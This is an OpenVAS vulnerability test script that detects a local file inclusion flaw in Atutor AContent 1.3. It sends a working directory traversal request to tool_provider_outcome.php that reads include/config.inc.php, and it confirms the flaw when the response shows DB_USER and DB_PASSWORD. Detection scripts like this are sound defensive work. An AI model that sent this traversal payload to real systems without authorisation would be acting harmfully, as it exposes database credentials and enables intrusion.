###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_acontent_lfi_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Atutor AContent Local File Inclusion Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";

tag_affected = "Atutor AContent version 1.3";
tag_insight = "The flaw is due to an input validation error in 'url' parameter to
  '/oauth/lti/common/tool_provider_outcome.php' script.";
tag_solution = "No solution or patch is available as of 26th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.atutor.ca";
tag_summary = "This host is installed with Atutor AContent and is prone to local
  file inclusion vulnerability.";

if(description)
{
  script_id(803346);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-26 15:10:47 +0530 (Tue, 26 Mar 2013)");
  script_name("Atutor AContent Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/83018");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24869");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/acontent-13-local-file-inclusion");

  script_description(desc);
  script_summary("Check if Atutor AContent is vulnerable to Local File Inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

## Check for each possible path
foreach dir (make_list("", "/AContent", "/Atutor/AContent", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/home/index.php"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if('>AContent</' >< res)
  {
    url = dir +'/oauth/lti/common/tool_provider_outcome.php?grade=1&key=1&'+
               'secret=secret&sourcedid=1&submit=Send%20Grade&url=../../../'+
               'include/config.inc.php';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern: "AContent",
       extra_check: make_list("DB_USER","DB_PASSWORD")))
    {
      security_hole(port);
      exit(0);
    }
  }
}
